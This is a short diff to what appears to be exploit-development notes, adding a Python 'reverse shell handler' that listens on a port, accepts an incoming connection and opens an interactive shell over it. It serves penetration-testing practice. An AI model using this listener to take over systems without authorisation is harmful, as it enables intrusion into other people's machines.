@@ -45,3 +45,25 @@ if args.proxy:
 # ...
 parser.add_argument("--proxy", help='proxy everything through burp', action='store_true', default=False)
 ```
+## Reverse shell handler
+```python
+import socket, telnetlib
+from threading import Thread
+# ...
+# Set the handler
+def handler(lport, target):
+    print("[+] Starting handler on %s [+]" %lport) 
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    print("[+] Connection from %s [+]" %target) 
+    t.sock = conn
+    print("[+] Shell >>")
+    t.interact()
+  
+# Set up the handler
+thr = Thread(target=handler,args=(int(lport), rhost))
+thr.start()
+```
